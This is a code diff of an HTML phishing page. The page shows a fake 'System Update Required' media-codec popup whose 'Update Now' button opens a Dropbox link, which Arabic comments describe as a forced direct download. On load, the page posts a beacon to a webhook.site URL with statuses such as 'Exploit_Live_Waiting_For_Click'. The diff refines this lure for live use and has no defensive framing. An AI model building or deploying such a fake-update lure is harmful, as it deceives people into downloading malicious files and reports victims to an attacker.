@@ -11,39 +11,29 @@
             position: absolute; width: 320px; background: #ffffff; padding: 25px; border-radius: 15px;
             text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); z-index: 999;
         }
-        h3 { color: #222; margin: 0 0 10px 0; font-size: 18px; }
-        p { color: #555; font-size: 13px; line-height: 1.4; }
-        button { 
-            background: #007bff; color: white; border: none; padding: 12px 25px; 
-            border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%;
-        }
-        button:hover { background: #0056b3; }
+        button { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; }
     </style>
 </head>
 <body>
-
     <div id="update-box">
         <h3>System Update Required</h3>
-        <p>A high-definition media codec update is required to view this content in 4K resolution.</p>
+        <p>A media codec update is required to view this content.</p>
         <button onclick="startDownload()">Update Now</button>
     </div>
-
     <img src="target_image.jpg">
 
     <script>
         function startDownload() {
-            // رابط دروب بوكس المعدل للتحميل المباشر القسري
-            const DROPBOX_DIRECT = "https://dropbox.com";
-            window.location.href = DROPBOX_DIRECT;
+            // [FORCE_DOWNLOAD]: رابط دروب بوكس الصافي والمباشر
+            const link = "https://dropbox.com";
+            
+            // فتح الرابط في نافذة جديدة لضمان عدم تعليق الصفحة الأساسية
+            window.open(link, '_blank');
         }
 
         window.onload = function() {
-            const WEBHOOK_URL = "https://webhook.site";
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ event: "Target_Ready_To_Attack", timestamp: new Date().toISOString() })
-            });
+            const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
+            fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({status: "Exploit_Live_Waiting_For_Click"}) });
         };
     </script>
 </body>
